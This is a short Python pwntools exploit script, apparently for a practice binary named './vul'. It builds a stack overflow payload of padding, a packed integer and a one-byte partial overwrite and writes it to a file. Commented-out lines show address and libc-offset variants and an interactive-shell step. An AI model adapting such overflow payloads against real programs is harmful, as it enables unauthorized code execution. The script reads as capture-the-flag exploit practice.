import struct
from pwn import *

context.log_level = 'error'
exe = context.binary = ELF(args.EXE or './vul')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


elf = context.binary = ELF("./vul")
libc = ELF('libc.so.6')

context.log_level = 'debug'
context.terminal = '/bin/sh'
# context.aslr = False
context.arch = 'amd64'
context.os = 'linux'


p = process("./vul")


integer_value = 12
integer_bytes = struct.pack("<Q", integer_value)

# gdb.attach(p)


junk = b'A' * 32
# payload = junk + integer_bytes + p64(0x404020)
# payload = junk + integer_bytes + pack(libc_base + 0x1fec8)
payload = junk + integer_bytes + b'\x48'
# payload = junk + integer_bytes + addr
# p.sendafter('name: '.encode(), payload)
# p.interactive()

file = open("payload", "wb")
file.write(payload)
file.close()

# io.sendline(payload)
# io.interactive()

